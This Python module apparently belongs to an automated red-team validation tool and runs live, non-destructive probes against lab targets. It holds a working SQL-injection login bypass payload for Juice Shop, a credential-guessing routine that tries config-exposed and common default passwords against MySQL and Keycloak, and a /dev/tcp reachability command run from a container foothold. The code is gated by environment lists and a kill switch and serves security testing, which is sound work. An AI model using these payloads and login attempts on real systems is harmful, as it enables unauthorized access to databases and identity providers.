"""Live, non-destructive validation probes for the red agent (PRD FR-10, FR-29).

By default the red agent *simulates* a validation from graph reachability. With
live probes enabled (``AEGIS_LIVE_PROBES=1``) the actions that have a real
target are executed against that target instead, so a path is marked
*validated* only when the attack actually worked:

    sqli-login-probe       POST the SC-001 payload to Juice Shop's login and check
                           whether an authenticated session comes back
    weak-credential-check  try the credential that the deployment config
                           exposes (plus a short list of common defaults) against
                           MySQL (native auth handshake) or Keycloak (OIDC token
                           endpoint), then log out / quit immediately
    reachability-probe     open and close a TCP connection

Every probe proves access and stops. Nothing is written, no session is kept,
secrets and tokens never reach the evidence (only hashes and metadata do).

Safety boundaries kept here, on top of the safety agent that gates every action
before it reaches the red agent:

* Live probes only run in the environments listed in ``AEGIS_LIVE_ENVIRONMENTS``
  (default ``range,canary``). The twin is a graph model, so proof re-runs and
  campaign rounds (which run in ``twin``) always stay simulated.
* The kill switch is checked again right before any network I/O.
* Credential attempts are capped (``max_attempts``).

When a probe cannot run (unsupported technique, target type, or no endpoint
resolves) it falls back to the graph simulation, and the evidence says so
(``mode: simulated`` plus ``live_skipped``). When it runs but cannot connect,
the outcome is ``unreachable`` and the validation does not count as proven.

Vantage point: probes run from the AEGIS host through the endpoint map (compose
published ports by default). With ``AEGIS_LIVE_VANTAGE=exec`` and a path that
starts on a container foothold, network reachability is additionally checked
*from that foothold* with ``docker exec <foothold> bash -c '</dev/tcp/host/port'``.
"""

from __future__ import annotations

import hashlib
import logging
import shutil
import socket
import struct
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

import httpx
import yaml

from .graph import AttackGraph
from .model import NodeKind
from .redteam import ActionResult, RedAgent, TelemetryEvent, ValidationAction, _marker, _now

log = logging.getLogger("aegis.probes")

SQLI_PAYLOAD = "' OR 1=1--"
COMMON_DEFAULTS = ["admin", "password", "root"]

# Secret variable -> (username variable, default username)
USERNAME_FOR = {
    "MYSQL_ROOT_PASSWORD": (None, "root"),
    "MYSQL_PASSWORD": ("MYSQL_USER", None),
    "KC_BOOTSTRAP_ADMIN_PASSWORD": ("KC_BOOTSTRAP_ADMIN_USERNAME", "admin"),
    "KEYCLOAK_ADMIN_PASSWORD": ("KEYCLOAK_ADMIN", "admin"),
}


class ProbeUnavailable(Exception):
    """The probe cannot run live here; fall back to simulation."""


@dataclass
class Endpoint:
    host: str
    port: int

    def __str__(self) -> str:
        return f"{self.host}:{self.port}"


@dataclass
class ProbeOutcome:
    succeeded: bool
    outcome: str                      # access-proven | blocked | unreachable
    detail: dict[str, Any] = field(default_factory=dict)


# --------------------------------------------------------------------------- endpoints
class EndpointResolver:
    """Maps (asset, container port) to an address reachable from the AEGIS host.

    Order: explicit overrides (``asset=host:port`` or ``asset:cport=host:port``),
    then compose published ports on ``127.0.0.1``.
    """

    def __init__(self, overrides: str = "", compose_file: Path | None = None, publish_host: str = "127.0.0.1") -> None:
        self.overrides: dict[str, Endpoint] = {}
        for item in (overrides or "").split(","):
            if "=" not in item:
                continue
            key, addr = (s.strip() for s in item.split("=", 1))
            host, _, port = addr.rpartition(":")
            if host and port.isdigit():
                self.overrides[key] = Endpoint(host, int(port))
        self.published: dict[tuple[str, int], int] = {}
        self.environment: dict[str, dict[str, str]] = {}
        self.publish_host = publish_host
        if compose_file and Path(compose_file).exists():
            self._load_compose(Path(compose_file))

    def _load_compose(self, path: Path) -> None:
        data = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
        for name, spec in (data.get("services") or {}).items():
            spec = spec or {}
            cname = spec.get("container_name", name)
            for entry in spec.get("ports") or []:
                pub, tgt = _parse_port(entry)
                if pub and tgt:
                    self.published[(cname, tgt)] = pub
            env = spec.get("environment") or {}
            if isinstance(env, list):
                env = dict(str(i).split("=", 1) for i in env if "=" in str(i))
            self.environment[cname] = {str(k): str(v) for k, v in env.items()}

    def resolve(self, asset: str, port: int | None) -> Endpoint | None:
        if port is not None and f"{asset}:{port}" in self.overrides:
            return self.overrides[f"{asset}:{port}"]
        if asset in self.overrides:
            return self.overrides[asset]
        if port is not None and (asset, port) in self.published:
            return Endpoint(self.publish_host, self.published[(asset, port)])
        return None

    def secret(self, asset: str, variable: str) -> tuple[str | None, str | None]:
        """(username, secret) from the deployment config. Never logged."""
        env = self.environment.get(asset, {})
        value = env.get(variable)
        user_var, default_user = USERNAME_FOR.get(variable, (None, None))
        user = env.get(user_var) if user_var else None
        return (user or default_user), value


def _parse_port(entry: Any) -> tuple[int | None, int | None]:
    if isinstance(entry, dict):
        return _int(entry.get("published")), _int(entry.get("target"))
    parts = str(entry).split("/")[0].split(":")
    if len(parts) == 1:
        return None, _int(parts[0])
    return _int(parts[-2]), _int(parts[-1])


def _int(v: Any) -> int | None:
    try:
        return int(v)
    except (TypeError, ValueError):
        return None


def _sha(value: str | bytes) -> str:
    data = value.encode() if isinstance(value, str) else value
    return hashlib.sha256(data).hexdigest()


# --------------------------------------------------------------------------- protocols
def tcp_reach(ep: Endpoint, timeout: float) -> ProbeOutcome:
    start = time.monotonic()
    try:
        with socket.create_connection((ep.host, ep.port), timeout=timeout):
            pass
    except OSError as exc:
        return ProbeOutcome(False, "unreachable", {"error": type(exc).__name__, "message": str(exc)})
    return ProbeOutcome(True, "access-proven", {"connect_ms": round((time.monotonic() - start) * 1000, 1)})


def sqli_login(ep: Endpoint, timeout: float) -> ProbeOutcome:
    """SC-001: Juice Shop login with an always-true email. Read-only."""
    url = f"http://{ep}/rest/user/login"
    try:
        resp = httpx.post(url, json={"email": SQLI_PAYLOAD, "password": "aegis-probe"}, timeout=timeout)
    except httpx.HTTPError as exc:
        return ProbeOutcome(False, "unreachable", {"url": url, "error": type(exc).__name__, "message": str(exc)})
    detail: dict[str, Any] = {"url": url, "http_status": resp.status_code, "response_sha256": _sha(resp.content)}
    token = None
    if resp.status_code == 200:
        try:
            auth = resp.json().get("authentication") or {}
            token = auth.get("token")
            detail["authenticated_as"] = auth.get("umail")
        except (ValueError, AttributeError):
            pass
    if token:
        detail["token_sha256"] = _sha(token)  # token itself is discarded
        return ProbeOutcome(True, "access-proven", detail)
    return ProbeOutcome(False, "blocked", detail)


def mysql_scramble(password: str, salt: bytes) -> bytes:
    """mysql_native_password: SHA1(pw) XOR SHA1(salt + SHA1(SHA1(pw)))."""
    if not password:
        return b""
    s1 = hashlib.sha1(password.encode()).digest()
    s2 = hashlib.sha1(s1).digest()
    s3 = hashlib.sha1(salt + s2).digest()
    return bytes(a ^ b for a, b in zip(s1, s3))


def _mysql_read(sock: socket.socket) -> tuple[int, bytes]:
    header = _recv_exact(sock, 4)
    length = header[0] | header[1] << 8 | header[2] << 16
    return header[3], _recv_exact(sock, length)


def _mysql_send(sock: socket.socket, seq: int, payload: bytes) -> None:
    sock.sendall(struct.pack("<I", len(payload))[:3] + bytes([seq & 0xFF]) + payload)


def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("connection closed by server")
        buf += chunk
    return buf


def mysql_login(ep: Endpoint, user: str, password: str, timeout: float) -> ProbeOutcome:
    """Authenticate with mysql_native_password, then COM_QUIT. Runs no query."""
    try:
        with socket.create_connection((ep.host, ep.port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            seq, pkt = _mysql_read(sock)
            if pkt[:1] == b"\xff":
                code = struct.unpack("<H", pkt[1:3])[0]
                return ProbeOutcome(False, "blocked", {"stage": "handshake", "mysql_error": code})
            if pkt[0] != 10:
                raise ProbeUnavailable(f"unsupported mysql protocol {pkt[0]}")
            end = pkt.index(b"\x00", 1)
            version = pkt[1:end].decode(errors="replace")
            pos = end + 1 + 4
            salt = pkt[pos:pos + 8]
            pos += 8 + 1 + 2 + 1 + 2 + 2
            auth_len = pkt[pos]
            pos += 1 + 10
            salt += pkt[pos:pos + max(13, auth_len - 8)].rstrip(b"\x00")
            pos += max(13, auth_len - 8)
            plugin = pkt[pos:].split(b"\x00", 1)[0].decode() or "mysql_native_password"
            if plugin != "mysql_native_password":
                raise ProbeUnavailable(f"auth plugin {plugin} not supported by the live probe")

            caps = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000  # LONG_PASSWORD|PROTOCOL_41|SECURE_CONN|PLUGIN_AUTH
            auth = mysql_scramble(password, salt[:20])
            resp = (struct.pack("<IIB", caps, 1 << 24, 33) + b"\x00" * 23 + user.encode() + b"\x00"
                    + bytes([len(auth)]) + auth + b"mysql_native_password\x00")
            _mysql_send(sock, seq + 1, resp)
            seq, pkt = _mysql_read(sock)
            if pkt[:1] == b"\xfe" and len(pkt) > 1:  # auth switch request
                name, _, data = pkt[1:].partition(b"\x00")
                if name.decode() != "mysql_native_password":
                    raise ProbeUnavailable(f"auth switch to {name.decode()} not supported")
                _mysql_send(sock, seq + 1, mysql_scramble(password, data.rstrip(b"\x00")[:20]))
                seq, pkt = _mysql_read(sock)
            ok = pkt[:1] == b"\x00"
            detail: dict[str, Any] = {"server_version": version, "user": user}
            if ok:
                _mysql_send(sock, 0, b"\x01")  # COM_QUIT
                detail["session"] = "closed with COM_QUIT"
                return ProbeOutcome(True, "access-proven", detail)
            if pkt[:1] == b"\xff":
                detail["mysql_error"] = struct.unpack("<H", pkt[1:3])[0]
            return ProbeOutcome(False, "blocked", detail)
    except ProbeUnavailable:
        raise
    except (OSError, ConnectionError, IndexError, struct.error) as exc:
        return ProbeOutcome(False, "unreachable", {"error": type(exc).__name__, "message": str(exc)})


def keycloak_login(ep: Endpoint, user: str, password: str, timeout: float, realm: str = "master") -> ProbeOutcome:
    """Password grant on the admin-cli client, then log the session out."""
    base = f"http://{ep}/realms/{realm}/protocol/openid-connect"
    try:
        resp = httpx.post(f"{base}/token", timeout=timeout, data={
            "grant_type": "password", "client_id": "admin-cli", "username": user, "password": password})
    except httpx.HTTPError as exc:
        return ProbeOutcome(False, "unreachable", {"error": type(exc).__name__, "message": str(exc)})
    detail: dict[str, Any] = {"url": f"{base}/token", "http_status": resp.status_code, "user": user}
    if resp.status_code != 200:
        return ProbeOutcome(False, "blocked", detail)
    body = resp.json()
    detail["token_sha256"] = _sha(body.get("access_token", ""))
    refresh = body.get("refresh_token")
    if refresh:
        try:
            out = httpx.post(f"{base}/logout", timeout=timeout, data={"client_id": "admin-cli", "refresh_token": refresh})
            detail["session"] = f"logged out (HTTP {out.status_code})"
        except httpx.HTTPError as exc:
            detail["session"] = f"logout failed: {type(exc).__name__}"
            detail["residual"] = "keycloak-session"
    return ProbeOutcome(True, "access-proven", detail)


# --------------------------------------------------------------------------- adapters
class LiveProbes:
    """Builds the ``live_adapters`` mapping for :class:`RedAgent`."""

    def __init__(
        self,
        resolver: EndpointResolver,
        environments: tuple[str, ...] = ("range", "canary"),
        timeout: float = 5.0,
        max_attempts: int = 3,
        vantage: str = "host",
        kill_switch: Any = None,
        runtime_cli: str | None = None,
        fallback: RedAgent | None = None,
    ) -> None:
        self.resolver = resolver
        self.environments = tuple(environments)
        self.timeout = timeout
        self.max_attempts = max(1, max_attempts)
        self.vantage = vantage
        self.kill_switch = kill_switch
        self.cli = runtime_cli or shutil.which("docker") or shutil.which("podman")
        self.fallback = fallback or RedAgent()

    def adapters(self) -> dict[str, Callable[[ValidationAction, AttackGraph, str], ActionResult]]:
        return {t: self.execute for t in ("sqli-login-probe", "weak-credential-check", "reachability-probe")}

    # ---------------------------------------------------------------- dispatch
    def execute(self, action: ValidationAction, graph: AttackGraph, environment: str) -> ActionResult:
        if environment not in self.environments:
            return self._simulate(action, graph, environment, f"environment {environment} is not live-enabled")
        if self.kill_switch is not None and self.kill_switch.engaged():
            return self._simulate(action, graph, environment, "kill switch engaged; no live I/O")
        endpoint = self.resolver.resolve(action.target, action.port)
        if endpoint is None:
            return self._simulate(action, graph, environment, f"no live endpoint for {action.target}:{action.port}")
        try:
            outcome, extra = self._run(action, graph, endpoint)
        except ProbeUnavailable as exc:
            return self._simulate(action, graph, environment, str(exc))

        foothold = self._foothold_reach(action, graph)
        if foothold is not None:
            extra["foothold_reachability"] = foothold
            if outcome.succeeded and not foothold["reachable"]:
                outcome = ProbeOutcome(False, "blocked", {**outcome.detail,
                                       "note": "exploitable from the AEGIS host but not from the path's foothold"})

        vuln = graph.nodes.get(action.vuln_id)
        event = TelemetryEvent(
            at=_now(), target=action.target, technique=action.technique, signature=action.signature,
            detail=f"live {action.technique} against {endpoint}", source="red-agent:live",
        )
        evidence = {
            "action_id": action.action_id,
            "vuln_id": action.vuln_id,
            "path_id": action.path_id,
            "environment": environment,
            "mode": "live",
            "endpoint": str(endpoint),
            "vantage": "aegis-host",
            "confidence": float(vuln.props.get("confidence", 0.5)) if vuln else 0.0,
            "telemetry_signature": action.signature,
            "probe": {**outcome.detail, **extra},
            "marker": _marker(action) if outcome.succeeded else None,
            "note": ("non-destructive live validation: proved access and stopped" if outcome.succeeded
                     else f"live validation did not prove access ({outcome.outcome})"),
        }
        return ActionResult(action, environment, outcome.succeeded, outcome.outcome, [event], evidence)

    def _run(self, action: ValidationAction, graph: AttackGraph, ep: Endpoint) -> tuple[ProbeOutcome, dict[str, Any]]:
        if action.technique == "reachability-probe":
            return tcp_reach(ep, self.timeout), {}
        if action.technique == "sqli-login-probe":
            return sqli_login(ep, self.timeout), {}
        if action.technique == "weak-credential-check":
            return self._credential(action, graph, ep)
        raise ProbeUnavailable(f"no live probe for {action.technique}")

    def _credential(self, action: ValidationAction, graph: AttackGraph, ep: Endpoint) -> tuple[ProbeOutcome, dict[str, Any]]:
        vuln = graph.nodes.get(action.vuln_id)
        variable = str((vuln.props if vuln else {}).get("secret_variable") or "")
        if not variable and vuln is not None:
            variable = vuln.id.rsplit("/", 1)[-1].upper()  # older graphs: .../weak-credential/<var>
        user, configured = self.resolver.secret(action.target, variable)
        if not user:
            raise ProbeUnavailable(f"no username known for {variable or 'credential'}")
        candidates: list[tuple[str, str]] = []
        if configured:
            candidates.append(("deployment-config", configured))
        candidates += [("common-default", c) for c in COMMON_DEFAULTS if c != configured]
        candidates = candidates[: self.max_attempts]

        asset_type = _asset_type(graph, action)
        if asset_type == "database" or action.port == 3306:
            attempt = lambda pw: mysql_login(ep, user, pw, self.timeout)  # noqa: E731
            protocol = "mysql-native-password"
        elif asset_type in ("idp", "directory"):
            attempt = lambda pw: keycloak_login(ep, user, pw, self.timeout)  # noqa: E731
            protocol = "oidc-password-grant"
        else:
            raise ProbeUnavailable(f"no live credential probe for asset type {asset_type!r}")

        last = ProbeOutcome(False, "blocked")
        for i, (source, pw) in enumerate(candidates, 1):
            last = attempt(pw)
            if last.succeeded or last.outcome == "unreachable":
                return last, {"protocol": protocol, "attempts": i, "credential_source": source if last.succeeded else None,
                              "secret_variable": variable}
        return last, {"protocol": protocol, "attempts": len(candidates), "credential_source": None,
                      "secret_variable": variable}

    def _foothold_reach(self, action: ValidationAction, graph: AttackGraph) -> dict[str, Any] | None:
        if self.vantage != "exec" or not self.cli or not action.entry.startswith("pos:"):
            return None
        node = graph.nodes.get(action.entry[4:])
        if node is None or node.props.get("asset_type") == "internet" or action.port is None:
            return None
        foothold = node.name
        cmd = [self.cli, "exec", foothold, "bash", "-c", f"timeout {int(self.timeout)} bash -c '</dev/tcp/{action.target}/{action.port}'"]
        try:
            rc = subprocess.run(cmd, capture_output=True, timeout=self.timeout + 10).returncode
        except (OSError, subprocess.TimeoutExpired) as exc:
            return {"foothold": foothold, "reachable": False, "error": type(exc).__name__}
        return {"foothold": foothold, "target": f"{action.target}:{action.port}", "reachable": rc == 0}

    def _simulate(self, action: ValidationAction, graph: AttackGraph, environment: str, reason: str) -> ActionResult:
        result = self.fallback._simulate(action, graph, environment)
        result.evidence["live_skipped"] = reason
        return result


def _asset_type(graph: AttackGraph, action: ValidationAction) -> str:
    for node in graph.nodes.values():
        if node.kind == NodeKind.ASSET and node.name == action.target:
            return str(node.props.get("asset_type", ""))
    return ""


def live_red_agent(settings: Any, kill_switch: Any = None) -> RedAgent:
    """A RedAgent wired with live probes from :class:`aegis.config.Settings`."""
    probes = LiveProbes(
        EndpointResolver(settings.live_targets, settings.compose_file),
        environments=tuple(e.strip() for e in settings.live_environments.split(",") if e.strip()),
        timeout=settings.probe_timeout,
        vantage=settings.live_vantage,
        kill_switch=kill_switch,
    )
    return RedAgent(live_adapters=probes.adapters())
